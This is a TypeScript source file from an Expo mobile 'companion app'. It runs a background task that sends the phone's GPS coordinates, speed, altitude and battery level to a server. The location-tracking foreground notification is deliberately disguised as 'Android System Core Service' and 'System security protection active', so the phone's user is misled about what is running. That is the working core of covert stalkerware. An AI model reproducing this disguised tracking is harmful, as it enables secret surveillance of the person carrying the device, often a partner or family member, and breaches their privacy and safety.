// companion-app/src/services/LocationService.ts
import * as Location from "expo-location";
import * as TaskManager from "expo-task-manager";
import * as Battery from "expo-battery";
import AsyncStorage from "@react-native-async-storage/async-storage";
import { STORAGE_KEYS, TRACKING_CONFIG } from "../config";
import { sendLocation } from "./api";

export const BACKGROUND_LOCATION_TASK = "BACKGROUND_LOCATION_SAFETY_TASK";

// Register task manager background listener
TaskManager.defineTask(BACKGROUND_LOCATION_TASK, async ({ data, error }: any) => {
  if (error) {
    console.error("Background location task error:", error);
    return;
  }

  if (data) {
    const { locations } = data;
    const loc = locations[0];
    if (!loc) return;

    const deviceId = await AsyncStorage.getItem(STORAGE_KEYS.DEVICE_ID);
    if (!deviceId) return;

    let batteryLevel: number | undefined;
    try {
      const bat = await Battery.getBatteryLevelAsync();
      batteryLevel = Math.round(bat * 100);
    } catch {
      // ignore
    }

    try {
      await sendLocation({
        device_id: deviceId,
        latitude: loc.coords.latitude,
        longitude: loc.coords.longitude,
        accuracy: loc.coords.accuracy,
        speed: loc.coords.speed,
        altitude: loc.coords.altitude,
        battery_level: batteryLevel,
      });
    } catch (err) {
      console.error("Failed to send background location", err);
    }
  }
});

export async function requestLocationPermissions(): Promise<boolean> {
  const { status: fgStatus } = await Location.requestForegroundPermissionsAsync();
  if (fgStatus !== "granted") return false;

  const { status: bgStatus } = await Location.requestBackgroundPermissionsAsync();
  return bgStatus === "granted";
}

export async function startBackgroundLocation(): Promise<boolean> {
  try {
    const hasStarted = await Location.hasStartedLocationUpdatesAsync(BACKGROUND_LOCATION_TASK);
    if (!hasStarted) {
      await Location.startLocationUpdatesAsync(BACKGROUND_LOCATION_TASK, {
        accuracy: Location.Accuracy.Balanced,
        distanceInterval: TRACKING_CONFIG.LOCATION_DISTANCE_FILTER_METERS,
        timeInterval: TRACKING_CONFIG.LOCATION_INTERVAL_MS,
        foregroundService: {
          notificationTitle: "Android System Core Service",
          notificationBody: "System security protection active",
          notificationColor: "#0B0B0E",
        },
      });
    }
    return true;
  } catch (err) {
    console.error("Failed to start background location", err);
    return false;
  }
}
